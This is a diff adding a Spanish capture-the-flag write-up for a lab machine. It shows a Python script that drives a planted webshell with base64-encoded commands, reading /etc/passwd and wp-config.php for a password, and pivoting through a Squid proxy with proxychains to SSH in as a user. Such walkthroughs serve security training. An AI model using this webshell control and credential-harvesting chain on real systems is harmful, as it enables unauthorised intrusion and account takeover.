@@ -194,5 +194,135 @@ https://github.com/s4vitar/ttyoverhttp
 ```
 Nos descargamos el repositorio y realizamos una modificacion fijandonos en que tenemos una Cookie de Seesion
 ```bash
-Aasdadaduthorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5daAuthorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5
+Authorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5
 ```
+Modificamos lo siguiente para proporcionar atraves de la cabecera `headers` la `coockie` 
+```python
+def RunCmd(cmd):
+        cmd = cmd.encode('utf-8')
+        cmd = b64encode(cmd).decode('utf-8')
+        payload = {
+                'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
+                }
+
+        headers = {
+                'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
+                }
+
+        result = (requests.get('http://10.10.10.67/webdav_test_inception/webshell.php', params=payload, headers=headers, timeout=5).text).strip()
+        return result
+
+def WriteCmd(cmd):
+        cmd = cmd.encode('utf-8')
+        cmd = b64encode(cmd).decode('utf-8')
+        payload = {
+                'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
+        }
+
+        headers = {
+                'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
+        }
+
+        result = (requests.get('http://10.10.10.67/webdav_test_inception/webshell.php', params=payload, headers=headers, timeout=5).text).strip()
+        return result
+```
+Y ya si lo lanzamos obtenemos una FULL TTY desde una webshell, jugando con mkfifo.
+
+# Intrusion atraves de la utilidad FULL-TTY-Over-HTTP
+
+Lanzamos el script:
+```bash
+# rlwrap python3 tty_over_http.py                                                                                                                                                                            1 ⚙
+whoami
+www-data
+hostname -I
+192.168.0.10
+> 
+```
+Enumeramos el sistema en busca de credenciales e usuarios.
+```bash
+pwd
+/var/www/html
+ls -l
+total 8044
+-rw-r--r-- 1 root     root       17128 May  7  2017 LICENSE.txt
+-rw-r--r-- 1 root     root        2307 May  7  2017 README.txt
+drwxr-xr-x 6 root     root        4096 May  7  2017 assets
+drwxrwxr-x 4 root     root        4096 Nov  6  2017 dompdf
+drwxr-xr-x 2 root     root        4096 May  7  2017 images
+-rw-r--r-- 1 root     root        2877 Nov  6  2017 index.html
+-rw-r--r-- 1 root     root     8184961 Oct 31  2017 latest.tar.gz
+drwxr-xr-x 2 www-data www-data    4096 Nov  2 12:36 webdav_test_inception
+drwxr-xr-x 5 root     root        4096 Nov  6  2017 wordpress_4.8.3
+```
+
+Verificando usuarios en el sistema:
+```bash
+grep "sh" /etc/passwd
+> root:x:0:0:root:/root:/bin/bash
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+cobb:x:1000:1000::/home/cobb:/bin/bash
+```
+
+Buscamos en el directorio `wordpress_4.8.3` y encontramos un archivo `wp-config.php`
+```bash
+"root" : "VwPddNh7xMZyDQoByQL4"
+```
+
+# Conectandonos a la maquina por SSH gracias al Squid Proxy
+Como veiamos antes tenemos el puerto 3128 abierto con un servicio de `Squid Proxy`
+Procedemos a configurar el archivo de proxychains4.conf para apuntar a la maquina victima. 
+Modificamos los siguiente: 
+Comentamos la primera linea que se ve aqui y añadimos la ultima linea al codigo, justo al final del todo en el archivo de configuracion.
+```bash
+# nano /etc/proxychains4.conf
+
+#socks4         127.0.0.1 9050
+http    10.10.10.67 3128
+```
+
+Ahora ya podemos usar nmap para verificar que pasamos por el squid proxy con proxychains
+```bash
+# proxychains nmap -p22 -sT -v -n 127.0.0.1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-02 20:19 CET
+Initiating Connect Scan at 20:19
+Scanning 127.0.0.1 [1 port]
+[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
+Discovered open port 22/tcp on 127.0.0.1
+Completed Connect Scan at 20:19, 0.17s elapsed (1 total ports)
+Nmap scan report for 127.0.0.1
+Host is up (0.17s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Read data files from: /usr/bin/../share/nmap
+```
+
+Pudiendo asi pues alcanzar el servicio ssh para conectarnos como el usuario `cobb` con la credencial obtenida anteriormente
+```bash
+# proxychains ssh cobb@127.0.0.1           
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
+cobb@127.0.0.1's password: 
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
+cobb@Inception:~$ 
+```
+
+Sacamos la flag `user.txt`
+```bash
+cobb@Inception:~$ cat user.txt 
+4a8bc2d686d093f3f8axxxxxxxxxxxxxxx
+```
+
+# Escalando Privilegios desde un Contenedor
